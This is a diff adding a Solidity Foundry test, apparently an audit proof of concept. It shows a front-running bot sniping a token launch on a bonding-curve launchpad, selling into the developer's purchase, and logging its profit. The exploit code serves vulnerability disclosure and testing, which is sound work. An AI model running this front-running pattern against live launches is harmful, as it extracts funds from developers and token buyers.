@@ -1,0 +1,80 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./LaunchpadTestBase.sol";
+import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";
+import "contracts/launchpad/libraries/RewardsTracker.sol";
+
+contract PoCLaunchpad is LaunchpadTestBase {
+    using SafeTransferLib for address;
+    /**
+     * PoC can utilize the following variables to access the relevant contracts:
+     * - factory: ERC1967Factory.sol
+     * - launchpad: Launchpad.sol
+     * - distributor: Distributor.sol
+     * - curve: SimpleBondingCurve.sol
+     * - launchpadLPVault: LaunchpadLPVault.sol
+     * - quoteToken: Quote token used in Launchpad system
+     * - uniV2Router: Uniswap V2 Router used in Launchpad system
+     */
+
+    function test_debug_submissionValidity() external {
+        address frontRunBot = makeAddr("frontRunBot");
+        fundAndApproveUser(frontRunBot, 100 ether);
+        fundAndApproveUser(dev, 100 ether);
+
+        console.log("=== BEFORE ATTACK ===");
+        uint initialFrontRunBotBalance = quoteToken.balanceOf(frontRunBot);
+        console.log("frontRunBot quoteToken balance: %e", quoteToken.balanceOf(frontRunBot));
+        console.log("developer   quoteToken balance: %e", quoteToken.balanceOf(dev));
+
+        //simulate frontRunBot sniping the launch.
+        //Buying 100M token or 10% supply. cost 100M = 0.87 ETH
+        buyLaunchToken(token, frontRunBot, BONDING_SUPPLY / 10);
+
+        //developer tries to buy 400M token or 50% supply . cost 400M = 19.2 ETH
+        buyLaunchToken(token, dev, BONDING_SUPPLY / 2);
+        console.log("front run sales");
+        console.log("frontRunBot quoteToken balance: %e", quoteToken.balanceOf(frontRunBot));
+        //frontRunBot
+        sellLaunchToken(token, frontRunBot, BONDING_SUPPLY / 10);
+
+        //developer tries to sell
+        sellLaunchToken(token, dev, BONDING_SUPPLY / 2 - 1); //@minus 1 to avoid another rounding issues with endRewards()
+
+        console.log("=== AFTER ATTACK ===");
+        console.log("frontRunBot quoteToken balance: %e", quoteToken.balanceOf(frontRunBot));
+        console.log("developer   quoteToken balance: %e", quoteToken.balanceOf(dev));
+
+        console.log("frontRunBot profit: %e", quoteToken.balanceOf(frontRunBot) - initialFrontRunBotBalance);
+        //profit 1.6 ETH from 0.87 ETH initial investment
+    }
+
+    function fundAndApproveUser(address _user, uint256 amount) internal {
+        quoteToken.mint(_user, amount);
+        vm.startPrank(_user);
+        quoteToken.approve(address(launchpad), type(uint256).max);
+        ERC20Harness(token).approve(address(launchpad), type(uint256).max);
+        vm.stopPrank();
+    }
+
+    function buyLaunchToken(address _token, address fromUser, uint256 amountOutBase) internal {
+        vm.startPrank(fromUser);
+        launchpad.buy(
+            ILaunchpad.BuyData({
+                account: fromUser,
+                token: _token,
+                recipient: fromUser,
+                amountOutBase: amountOutBase,
+                maxAmountInQuote: type(uint256).max
+            })
+        );
+        vm.stopPrank();
+    }
+
+    function sellLaunchToken(address _token, address fromUser, uint256 amountInBase) internal {
+        vm.startPrank(fromUser);
+        launchpad.sell(fromUser, _token, fromUser, amountInBase, 0);
+        vm.stopPrank();
+    }
+}
